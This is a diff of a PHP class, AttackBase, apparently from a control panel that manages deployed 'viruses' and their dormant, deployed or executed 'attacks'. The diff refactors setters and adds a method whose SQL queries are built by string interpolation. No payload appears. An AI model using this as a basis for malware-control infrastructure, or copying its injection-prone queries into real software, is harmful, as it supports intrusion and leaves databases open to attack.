@@ -4,6 +4,7 @@ namespace Kelvinho\Virus\Attack;
 
 use Kelvinho\Virus\Network\RequestData;
 use Kelvinho\Virus\Network\Session;
+use Kelvinho\Virus\Singleton\Header;
 use Kelvinho\Virus\Singleton\Logs;
 use Kelvinho\Virus\Usage\Usage;
 use Kelvinho\Virus\Usage\UsageFactory;
@@ -27,11 +28,9 @@ use mysqli;
  * @license http://www.opensource.org/licenses/mit-license.html  MIT License
  */
 abstract class AttackBase {
-    public const STATUS_ALL = "All";
     public const STATUS_DORMANT = "Dormant";
     public const STATUS_EXECUTED = "Executed";
     public const STATUS_DEPLOYED = "Deployed";
-    public const TYPE_ALL = 0;
     public const TYPE_ONE_TIME = 1;
     public const TYPE_SESSION = 2;
     public const TYPE_BACKGROUND = 3;
@@ -79,10 +78,6 @@ abstract class AttackBase {
         return $this->status;
     }
 
-    public function setStatus(string $status): void {
-        $this->status = $status;
-    }
-
     public function isStatus(string $status): bool {
         return $status == $this->status;
     }
@@ -107,7 +102,7 @@ abstract class AttackBase {
         return $this->packageDbName;
     }
 
-    function setPackageDbName(string $packageDbName): void {
+    public function setPackageDbName(string $packageDbName): void {
         $this->packageDbName = $packageDbName;
     }
 
@@ -115,8 +110,12 @@ abstract class AttackBase {
         return $this->virus_id;
     }
 
-    function setVirusId(string $virus_id): void {
+    public function setVirusId(string $virus_id): void {
         $this->virus_id = $virus_id;
+    }
+
+    public function getStatePath(): string {
+        return DATA_FILE . "/attacks/$this->attack_id/state.json";
     }
 
     public function loadState(): void {
@@ -129,7 +128,7 @@ abstract class AttackBase {
         $this->status = $row["status"];
         $this->executed_time = $row["executed_time"];
         $this->usage = $this->usageFactory->get($row["resource_usage_id"]);
-        $this->setState(file_get_contents(DATA_FILE . "/attacks/$this->attack_id/state.json"));
+        $this->setState(file_get_contents($this->getStatePath()));
         $this->setProfile(file_get_contents(DATA_FILE . "/attacks/$this->attack_id/profile.txt"));
     }
 
@@ -229,16 +228,6 @@ abstract class AttackBase {
     }
 
     /**
-     * Sets the executed time.
-     *
-     * @param int $executedTime
-     * @internal Should only be used by AttackFactory
-     */
-    public function setExecutedTime(int $executedTime): void {
-        $this->executed_time = $executedTime;
-    }
-
-    /**
      * Deletes the attack permanently.
      */
     public function delete(): void {
@@ -273,5 +262,19 @@ abstract class AttackBase {
         $virus->usage()->addDynamic($this->usage)->saveState();
         $this->userFactory->get($virus->getUserHandle())->usage()->addDynamic($this->usage)->saveState();
         $this->usage->resetDynamic()->saveState();
+    }
+
+    /**
+     * Returns an array of 2 attack ids representing the previous and next attack. Can be null.
+     *
+     * @return array
+     */
+    public function getAround(): array {
+        $around = [null, null];
+        if (!$answer = $this->mysqli->query("select attack_id from attacks where virus_id=\"$this->virus_id\" and executed_time > " . $this->executed_time . " order by executed_time limit 1")) Logs::mysql($this->mysqli);
+        if ($row = $answer->fetch_assoc()) $around[1] = $row["attack_id"];
+        if (!$answer = $this->mysqli->query("select attack_id from attacks where virus_id=\"$this->virus_id\" and executed_time < " . $this->executed_time . " order by executed_time desc limit 1")) Logs::mysql($this->mysqli);
+        if ($row = $answer->fetch_assoc()) $around[0] = $row["attack_id"];
+        return $around;
     }
 }
